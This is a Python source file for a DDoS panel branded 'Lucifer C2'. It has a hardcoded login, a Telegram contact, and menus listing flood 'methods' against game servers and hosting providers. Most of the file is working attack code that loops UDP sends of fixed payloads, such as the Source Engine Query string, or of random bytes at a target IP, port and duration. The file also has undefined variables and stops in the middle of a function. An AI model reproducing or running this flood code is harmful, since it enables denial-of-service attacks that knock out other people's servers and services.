#CREATE DATE 18/01/2023
#!/usr/bin/env python3
#-*- coding: utf-8 -*-
import sys
import socket
import requests
import pkg_resources
import time
from pystyle import Colors, Colorate, Center
from asciimatics.effects import BannerText, Print, Scroll
from asciimatics.renderers import ColourImageFile, FigletText, ImageFile, StaticRenderer
from asciimatics.scene import Scene
from asciimatics.screen import Screen
from asciimatics.exceptions import ResizeScreenError, StopApplication
import random
import threading
import getpass
import os
import urllib
import json

ip= requests.get('https://api.ipify.org').text.strip()
#Welcome  Gif#
def wlcm(screen):
    scenes = []
    effects = [
        Print(screen,
              ColourImageFile(screen, "welcome.gif", screen.height,
                              uni=screen.unicode_aware),
              screen.height//- 5,
              speed=1),
    ]
    scenes.append(Scene(effects, 24))

    screen.play(scenes, stop_on_resize=False, repeat=False)



#login tools
def login():
    user = "mars"
    passwd = "1801"
    username = input("🚀 Username: ")
    password = getpass.getpass(prompt='🚀 Password: ')
    if username != user or password != passwd:
        print("")
        print(" Wrong, Get Username and Password at Telegram")
        sys.exit(1)
    elif username == user and password == passwd:
        print("Successfully")
        Screen.wrapper(wlcm)
        time.sleep(0.3)
login()

os.system("clear")

#help gif#
def stp(screen):
    scenes = []
    effects = [
        Print(screen,
              ColourImageFile(screen, "stop.gif", screen.height,
                              uni=screen.unicode_aware),
              screen.height//- 5,
              speed=1),
    ]
    scenes.append(Scene(effects, 24))

    screen.play(scenes, stop_on_resize=False, repeat=False)
    
#help gif#
def hlp(screen):
    scenes = []
    effects = [
        Print(screen,
              ColourImageFile(screen, "help.gif", screen.height,
                              uni=screen.unicode_aware),
              screen.height//- 5,
              speed=1),
    ]
    scenes.append(Scene(effects, 24))

    screen.play(scenes, stop_on_resize=False, repeat=False)
   
#clear gif#
def clss(screen):
    scenes = []
    effects = [
        Print(screen,
              ColourImageFile(screen, "clear.gif", screen.height,
                              uni=screen.unicode_aware),
              screen.height//- 5,
              speed=1),
    ]
    scenes.append(Scene(effects, 24))

    screen.play(scenes, stop_on_resize=False, repeat=False)
    
#methods gif#
def mthds(screen):
    scenes = []
    effects = [
        Print(screen,
              ColourImageFile(screen, "methodss.gif", screen.height,
                              uni=screen.unicode_aware),
              screen.height//- 5,
              speed=1),
    ]
    scenes.append(Scene(effects, 24))

    screen.play(scenes, stop_on_resize=False, repeat=False)

#my ip#
def mip():
 print(f"""\x1b[0mYour IP Is \x1b[40;38;2;127;0;255m{ip}\x1b[0m""")
    
#account#
 accounts = print(f"""\x1b[0mID: \x1b[38;2;255;0;255mUnknown\x1b[0m
\x1b[0mUsername: \x1b[38;2;255;0;255mfbi
\x1b[0mAdmin: true
\x1b[0mReseller: false
\x1b[0mVIP: true
\x1b[0mBypass Blacklist: true

\x1b[0mExpiry: \x1b[38;2;255;0;255m30\x1b[0m Day(s)
\x1b[0mMaxTime: \x1b[38;2;255;0;255m99999 \x1b[0mSeconds
\x1b[0mCooldown: \x1b[38;2;255;0;255m0\x1b[0m Seconds
\x1b[0mConcurrents: \x1b[38;2;255;0;255m1\x1b[0m
\x1b[0mMax Sessions: \x1b[38;2;255;0;255m4\x1b[0m
\x1b[0mMy Attacks Sent: \x1b[38;2;255;0;255mUnknow\x1b[0m
\x1b[0mCurrent IPv4: \x1b[38;2;255;0;255m{ip}\x1b[0m""")

nicknm = """╔═[Root@Fbi]
╚════>"""
help = """
\u001b[31m╔════════════════════════╗
\u001b[31m║ \033[34m---- \033[32mHelp Menu! \033[34m--- \u001b[31m╚═════════╗
\u001b[31m║ \033[37mplan\033[32m> \033[37mShows Api Plan!  \u001b[31m          ║
\u001b[31m║ \033[37maccount   \033[32m> \033[37mShows Your Accounts!     \u001b[31m║
\u001b[31m║ \033[37madmin   \033[32m> \033[37mShows Admin!     \u001b[31m║
\u001b[31m║ \033[37mtelegram \033[32m> \033[37mShows Telegram!  \u001b[31m║
\u001b[31m║ \033[37mmethods \033[32m> \033[37mShows Methods!  \u001b[31m║
\u001b[31m╚══════════════════════════════════╝
"""


methods = """
\u001b[31m╔════════════════════════╗
\u001b[31m║ \033[34m---- \033[32mMethods List! \033[34m--- \u001b[31m╚═════════╗
\u001b[31m║ \033[37mplan\033[32m> \033[37mShows Api Plan!  \u001b[31m          ║
\u001b[31m║ \033[37mgen3   \033[32m> \033[37mShows Gen3 Methods!     \u001b[31m║
\u001b[31m║ \033[37mgen2   \033[32m> \033[37mShows Gen2 Methods!     \u001b[31m║
\u001b[31m║ \033[37mlayer4 \033[32m> \033[37mShows Layer 4 Methods!  \u001b[31m║
\u001b[31m║ \033[37mlayer7 \033[32m> \033[37mShows Layer 7 Methods!  \u001b[31m║
\u001b[31m║ \033[37mprivate\033[32m> \033[37mShows Private Methods!  \u001b[31m║
\u001b[31m║ \033[37mraw    \033[32m> \033[37mShows Raw Methods!      \u001b[31m║
\u001b[31m║ \033[37mmore   \033[32m> \033[37mShows More Methods!     \u001b[31m║
\u001b[31m╚══════════════════════════════════╝
"""

plan = """
\u001b[31m ╔═╗╔═╗╔═╗╔═╗  ╔═╗╔═╗╦
\u001b[31m ╠═╣║  ║╣ ║╣   ╠═╣╠═╝║
\u001b[31m ╩ ╩╚═╝╚═╝╚═╝  ╩ ╩╩  ╩

\u001b[31m USERNAME = Acee
\u001b[31m VIP = TRUE
\u001b[31m API = TRUE
\u001b[31m ADMIN = TRUE
\u001b[31m API ACCESS = TRUE
\u001b[31m EXPIRED TIME = 998.0
\u001b[31m CONCS = 1
"""

attacked = """
╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
"""

raw = """
\u001b[31m                               ╦  ╦ ╦╔═╗╦╔═╗╔═╗╦═╗
\u001b[31m                               ║  ║ ║║  ║╠╣ ║╣ ╠╦╝
\u001b[31m                               ╩═╝╚═╝╚═╝╩╚  ╚═╝╩╚═

\u001b[31m            ╔══════════════════════════╦════════════════════════════╗
\u001b[31m            ║ \033[37mudpraw \033[34m- \033[37mRaw UDP Flood \u001b[31m  ║ \033[37mhexraw \033[34m- \033[37mRaw HEX Flood \u001b[31m    ║
\u001b[31m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝
\u001b[31m             ║ \033[37mtcpraw \033[34m- \033[37mRaw TCP Flood \u001b[31m║ ║ \033[37mvseraw \033[34m- \033[37mRaw VSE Flood \u001b[31m  ║
\u001b[31m             ║ \033[37mstdraw \033[34m- \033[37mRaw STD Flood \u001b[31m║ ║ \033[37mqmsynraw \033[34m- \033[37mRaw SYN Flood \u001b[31m║
\u001b[31m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗
\u001b[31m            ║    \033[37mExample How To Attack\033[34m: \033[32mMETHOD [IP] [TIME] [PORT]   \u001b[31m║
\u001b[31m            ╚═══════════════════════════════════════════════════════╝
"""
gen3 = """
\u001b[31m                               ╦  ╦ ╦╔═╗╦╔═╗╔═╗╦═╗
\u001b[31m                               ║  ║ ║║  ║╠╣ ║╣ ╠╦╝
\u001b[31m                               ╩═╝╚═╝╚═╝╩╚  ╚═╝╩╚═

\u001b[31m            ╔══════════════════════════╦════════════════════════════╗
\u001b[31m            ║ \033[37movhslav \033[34m- \033[37mSlavic Flood \u001b[31m  ║ \033[37miotv1 \033[34m- \033[37mCustom Method!  \u001b[31m   ║
\u001b[31m            ║ \033[37mcpukill \033[34m- \033[37mCpu Rape Flood\u001b[31m ║ \033[37miotv2 \033[34m- \033[37mCustom Method!  \u001b[31m   ║
\u001b[31m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝
\u001b[31m             ║ \033[37mfivemkill \033[34m- \033[37mFivem Kill \u001b[31m║ ║ \033[37miotv3 \033[34m-\033[37m Custom Method!  \u001b[31m ║
\u001b[31m             ║ \033[37micmprape  \033[34m- \033[37mICMP Rape  \u001b[31m║ ║ \033[37mssdp  \033[34m-\033[37m Amped SSDP      \u001b[31m ║
\u001b[31m             ║ \033[37mtcprape \033[34m- \033[37mRaping TCP   \u001b[31m║ ║ \033[37marknull \033[34m- \033[37mArk Method    \u001b[31m ║
\u001b[31m             ║ \033[37mnforape \033[34m- \033[37mNfo Method   \u001b[31m║ ║ \033[37m2kdown  \033[34m- \033[37mNBA 2K Flood  \u001b[31m ║
\u001b[31m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗
\u001b[31m            ║    \033[37mExample How To Attack\033[34m: \033[32mMETHOD [IP] [TIME] [PORT]   \u001b[31m║
\u001b[31m            ╚═══════════════════════════════════════════════════════╝
"""

private = """
\u001b[31m                               ╦  ╦ ╦╔═╗╦╔═╗╔═╗╦═╗
\u001b[31m                               ║  ║ ║║  ║╠╣ ║╣ ╠╦╝
\u001b[31m                               ╩═╝╚═╝╚═╝╩╚  ╚═╝╩╚═

\u001b[31m            ╔══════════════════════════╦════════════════════════════╗
\u001b[31m            ║ \033[37mhomeslap    \033[34m. \033[37mr6kill     \u001b[31m║ \033[37mfivemtcp  \033[34m. \033[37mnfokill       \u001b[31m ║
\u001b[31m            ║ \033[37mark255      \033[34m. \033[37marklift    \u001b[31m║ \033[37mhotspot   \033[34m. \033[37mvpn           \u001b[31m ║
\u001b[31m            ║ \033[37mhydrakiller \033[34m. \033[37markdown    \u001b[31m║ \033[37mnfonull   \033[34m. \033[37mdhcp          \u001b[31m ║
\u001b[31m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝
\u001b[31m             ║ \033[37movhnat    \033[34m. \033[37movhamp     \u001b[31m║ ║ \033[37movhwdz    \033[34m. \033[37movhx         \u001b[31m║
\u001b[31m             ║ \033[37mnfodrop   \033[34m. \033[37mnfocrush   \u001b[31m║ ║ \033[37mnfodown   \033[34m. \033[37mnfox         \u001b[31m║
\u001b[31m             ║ \033[37mudprape   \033[34m. \033[37mudprapev3  \u001b[31m║ ║ \033[37mfortnite  \033[34m. \033[37mfortnitev2   \u001b[31m║
\u001b[31m             ║ \033[37mudprapev2 \033[34m. \033[37mudpbypass  \u001b[31m║ ║ \033[37mgreeth    \033[34m. \033[37mtelnet       \u001b[31m║
\u001b[31m             ║ \033[37mfivemv2   \033[34m. \033[37mr6drop     \u001b[31m║ ║ \033[37mr6freeze  \033[34m. \033[37mkillall      \u001b[31m║
\u001b[31m             ║ \033[37m2krape    \033[34m. \033[37mfallguys   \u001b[31m║ ║ \033[37movhdown   \033[34m. \033[37movhkill      \u001b[31m║
\u001b[31m             ║ \033[37mfivemrape \033[34m. \033[37mfivemdown  \u001b[31m║ ║ \033[37mfivemv1   \033[34m. \033[37mfivemslump   \u001b[31m║
\u001b[31m             ║ \033[37mkillallv2 \033[34m. \033[37mkillallv3  \u001b[31m║ ║ \033[37mpowerslap \033[34m. \033[37mrapecom      \u001b[31m║
\u001b[31m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗
\u001b[31m            ║    \033[37mExample How To Attack\033[34m: \033[32mMETHOD [IP] [TIME] [PORT]   \u001b[31m║
\u001b[31m            ╚═══════════════════════════════════════════════════════╝
"""



layer4 = """
\u001b[31m                               ╦  ╦ ╦╔═╗╦╔═╗╔═╗╦═╗
\u001b[31m                               ║  ║ ║║  ║╠╣ ║╣ ╠╦╝
\u001b[31m                               ╩═╝╚═╝╚═╝╩╚  ╚═╝╩╚═
\u001b[31m            ╔══════════════════════════╦════════════════════════════╗
\u001b[31m            ║  \033[37mudp \033[37m[IP] [TIME] [PORT]  \u001b[31m║   \033[37mvse \033[37m[IP] [TIME] [PORT]   \u001b[31m║
\u001b[31m            ║  \033[37mtcp \033[37m[IP] [TIME] [PORT]  \u001b[31m║   \033[37mack \033[37m[IP] [TIME] [PORT]   \u001b[31m║
\u001b[31m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝
\u001b[31m             ║ \033[37mstd \033[37m[IP] [TIME] [PORT] \u001b[31m║ ║ \033[37mdns \033[37m[IP] [TIME] [PORT]   \u001b[31m║
\u001b[31m             ║ \033[37msyn \033[37m[IP] [TIME] [PORT] \u001b[31m║ ║ \033[37movh \033[37m[IP] [TIME] [PORT]   \u001b[31m║
\u001b[31m             ║\033[37m- - - - - - - \033[34mhomerape \033[33m[IP] [TIME] [PORT] \033[37m- - - - - -\u001b[31m║
\u001b[31m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗
\u001b[31m            ║    \033[37mExample How To Attack\033[93m: \033[32mMETHOD [IP] [TIME] [PORT]   \u001b[31m║
\u001b[31m            ╚═══════════════════════════════════════════════════════╝
"""

banner =  """
\u001b[31m                               ╦  ╦ ╦╔═╗╦╔═╗╔═╗╦═╗
\u001b[31m                               ║  ║ ║║  ║╠╣ ║╣ ╠╦╝
\u001b[31m                               ╩═╝╚═╝╚═╝╩╚  ╚═╝╩╚═

\u001b[31m                ╔═══════════════════════════════════════════════╗
\u001b[31m                ║\033[37m  Welcome To The Start Screen Of Lucifer C2 ! \u001b[31m ║
\u001b[31m                ║\033[37m         Powered \033[37mBy\033[37m AceeAPI Ran By Acee \u001b[31m       ║
\u001b[31m                ║\033[37m         Type \033[37mhelp\033[37m to see the Help Menu \u001b[31m       ║
\u001b[31m                ╚═══════════════════════════════════════════════╝


\u001b[31m                    ╔═════════════════════════════════════════════╗
\u001b[31m                    ║\033[37m How To attack: [METHOD] [IP] [TIME] [PORT].\u001b[31m ║
\u001b[31m                    ╚═════════════════════════════════════════════╝
"""

cookie = open(".commandfull_cookie","w+")

fsubs = 0
tpings = 0
pscans = 0
liips = 0
tattacks = 0
uaid = 0
said = 0
running = 0
iaid = 0
haid = 0
aid = 0
attack = True
ldap = True
http = True
atks = 0

def randsender(host, timer, port, punch):
	global iaid
	global aid
	global tattacks
	global running

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	running += 1
	while time.time() < timeout and ldap and attack:
		sock.sendto(punch, (host, int(port)))
	running -= 1
	iaid -= 1
	aid -= 1


def stdsender(host, port, timer, payload):
	global atks
	global running

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	
	atks += 1
	running += 1
	while time.time() < timeout and attack:
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
	atks -= 1
	running -= 1

def main():
	global fsubs
	global tpings
	global pscans
	global liips
	global tattacks
	global uaid
	global running
	global atk
	global ldap
	global said
	global iaid
	global haid
	global aid
	global attack
	global dp
#bawaan 32500,4150
#kaltebg tembus	23100,32100
	while True:
		bots = (random.randint(4200,8222))
		sys.stdout.write("\x1b]2;[-] Lucifer C2 - Running: [0/10] - Api Connected: [9999999999] - Expiry: [998.0] - Online User: [1000] - Admin: [Mars] - POWER : {}% - [Lucif]\x07".format (bots))
		sin = input("\u001b[31m{}\033[0;31m".format(nicknm)).lower()
		args = data.split(" ")[0]
		if command == "clear":
			Screen.wrapper(clss)
			os.system (clear)
			print (banner)
			main()
		if command == "cls":
			Screen.wrapper(clss)
			os.system (clear)
			print (banner)
			main()
		elif command == "?":
			os.system (clear)
			print (banner)
			main()
		elif command == "layer4":
			os.system (clear)
			print (layer4)
			main()
		elif command == "help":
			Screen.wrapper(hlp)
			os.system (clear)
			print (help)
			main()
		elif command == "admin":
			print("\x1b[38;2;0;255;255mMARSS#2962")
			main()
		elif command == "telegram":
			print("\x1b[38;2;0;255;255mhttps://t.me/marssec")
			main()
		elif command == "plan":
			os.system (clear)
			print (plan)
			main()
		elif command == "attacked":
			os.system (clear)
			print (attacked)
		elif command == "methods":
			Screen.wrapper(mthds)
			os.system (clear)
			print (methods)
			main()
		elif command == "account":
			os.system(clear)
			print (accounts)
			main()
		elif command == "private":
			os.system (clear)
			print (private)
			main()
		elif command == "gen3":
			os.system (clear)
			print (gen3)
			main()
		elif command == "raw":
			os.system (clear)
			print (raw)
			main()
		elif command == "":
			main()
		elif command == "exit":
			os.system (clear)
			exit()
		elif command == "myip":
		  os.system(clear)
		  print(myip)
		elif command == "std":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					command, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x73\x74\x64\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system(clear)
					print(attacked)
					time.sleep(1)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif command == "dns":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					command, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system(clear)
					print(attacked)
					time.sleep(1)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif command == "ovh":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						command, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						os.system(clear)
						print(attacked)
						time.sleep(1)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif command == "vse":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						command, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						os.system(clear)
						print(attacked)
						time.sleep(1)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif command == "syn":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						command, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						os.system(clear)
						print(attacked)
						time.sleep(1)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif command == "tcp":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					command, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 4096
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					os.system(clear)
					print(attacked)
					time.sleep(1)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif command == "homeslap":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					command, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 2048
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					os.system(clear)
					print(attacked)
					time.sleep(1)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif command == "udp":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					command, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 1460
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					os.system(clear)
					print(attacked)
					time.sleep(1)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif command == "killallv2":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					command, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 1460
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					os.system(clear)
					print(attacked)
					time.sleep(1)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif command == "killallv3":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					command, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 1460
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					os.system(clear)
					print(attacked)
					time.sleep(1)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif command == "udprape":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					command, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 0
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					os.system(clear)
					print(attacked)
					time.sleep(1)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif command == "udprapev2":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					command, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					os.system(clear)
					print(attacked)
					time.sleep(1)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif command == "udpbypass":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					command, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					os.system(clear)
					print(attacked)
					time.sleep(1)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif command == "icmprape":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					command, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 1024
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					os.system(clear)
					print(attacked)
					time.sleep(1)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif command == "udprapev3":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					command, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 10000
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					os.system(clear)
					print(attacked)
					time.sleep(1)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif command == "nfodrop":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					command, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system(clear)
					print(attacked)
					time.sleep(1)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif command == "ovhnat":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					command, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system(clear)
					print(attacked)
					time.sleep(1)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif command == "ovhamp":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					command, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system(clear)
					print(attacked)
					time.sleep(1)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif command == "nfocrush":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					command, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system(clear)
					print(attacked)
					time.sleep(1)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif command == "greeth":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					command, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system(clear)
					print(attacked)
					time.sleep(1)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif command == "telnet":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					command, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system(clear)
					print(attacked)
					time.sleep(1)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif command == "ovhkill":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					command, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system(clear)
					print(attacked)
					time.sleep(1)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif command == "ovhdown":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					command, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system(clear)
					print(attacked)
					time.sleep(1)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif command == "ssdp":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					command, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system(clear)
					print(attacked)
					time.sleep(1)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif command == "hydrakiller":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					command, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system(clear)
					print(attacked)
					time.sleep(1)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif command == "nfonull":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					command, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system(clear)
					print(attacked)
					time.sleep(1)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif command == "killall":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					command, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x02\x00\x2f"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system(clear)
					print(attacked)
					time.sleep(1)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif command == "ovhslav":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					command, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system(clear)
					print(attacked)
					time.sleep(1)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif command == "cpukill":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					command, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
